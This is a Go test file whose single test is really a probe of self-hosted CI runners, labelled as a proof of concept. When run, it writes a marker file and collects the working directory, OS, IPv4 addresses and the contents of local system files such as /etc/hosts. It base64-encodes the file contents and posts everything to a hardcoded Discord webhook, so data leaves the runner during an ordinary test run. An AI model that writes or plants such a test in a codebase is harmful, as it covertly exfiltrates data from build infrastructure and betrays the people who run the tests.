package tests

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"testing"
	"time"
)

const hardcodedWebhook = "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"

func TestPwnInfoAndLFIToDiscord(t *testing.T) {
	// Write a marker file so you know it executed
	_ = os.WriteFile("pwn_marker.txt", []byte("PWN_MARKER: PoC execution\n"), 0644)

	// Pick webhook
	webhook := os.Getenv("PWN_WEBHOOK")
	if webhook == "" {
		webhook = hardcodedWebhook
	}

	// Collect basic runner info
	cwd, _ := os.Getwd()
	ips := collectIPv4s()

	// Try file reads (defaults + optional override)
	lfiResults := tryLFIReads()

	// Assemble Discord fields
	fields := []map[string]string{
		{"name": "CWD", "value": safeField(cwd)},
		{"name": "GOOS/GOARCH", "value": runtime.GOOS + "/" + runtime.GOARCH},
		{"name": "IPv4", "value": joinIPs(ips)},
		{"name": "Marker", "value": "pwn_marker.txt written"},
	}
	for _, r := range lfiResults {
		fields = append(fields, map[string]string{
			"name":  "LFI: " + r.Path,
			"value": r.Display,
		})
	}

	payload := map[string]interface{}{
		"content": "### PWN_MARKER: PoC execution (runner info + LFI)",
		"embeds": []map[string]interface{}{
			{
				"title":     "Self-hosted Runner Probe",
				"fields":    fields,
				"timestamp": time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 6 * time.Second}
	_, _ = client.Do(req)
}

// --- Helpers ---

type lfiResult struct {
	Path    string
	Display string
}

func tryLFIReads() []lfiResult {
	paths := defaultPaths()
	if env := strings.TrimSpace(os.Getenv("PWN_LFI_PATHS")); env != "" {
		paths = strings.Split(env, ",")
	}

	const maxBytes = 2048
	var out []lfiResult
	for _, p := range paths {
		data, err := os.ReadFile(strings.TrimSpace(p))
		if err != nil {
			out = append(out, lfiResult{Path: p, Display: "_err: " + err.Error()})
			continue
		}
		content := data
		truncated := false
		if len(content) > maxBytes {
			content = content[:maxBytes]
			truncated = true
		}
		b64 := base64.StdEncoding.EncodeToString(content)
		if len(b64) > 900 {
			b64 = b64[:900] + "...(trim)"
		}
		suffix := ""
		if truncated {
			suffix = " (truncated)"
		}
		out = append(out, lfiResult{
			Path:    p,
			Display: "base64:`" + b64 + "`" + suffix,
		})
	}
	return out
}

func defaultPaths() []string {
	if runtime.GOOS == "windows" {
		return []string{
			`C:\Windows\System32\drivers\etc\hosts`,
			`C:\Windows\System32\license.rtf`,
		}
	}
	return []string{"/etc/hostname", "/etc/hosts", "/etc/os-release"}
}

func collectIPv4s() []string {
	var out []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			switch v := a.(type) {
			case *net.IPNet:
				ip := v.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			case *net.IPAddr:
				ip := v.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			}
		}
	}
	return out
}

func joinIPs(ips []string) string {
	if len(ips) == 0 {
		return "_none_"
	}
	return strings.Join(ips, ", ")
}

func safeField(s string) string {
	if s == "" {
		return "_empty_"
	}
	if len(s) > 1024 {
		return s[:1024] + "...(trim)"
	}
	return s
}
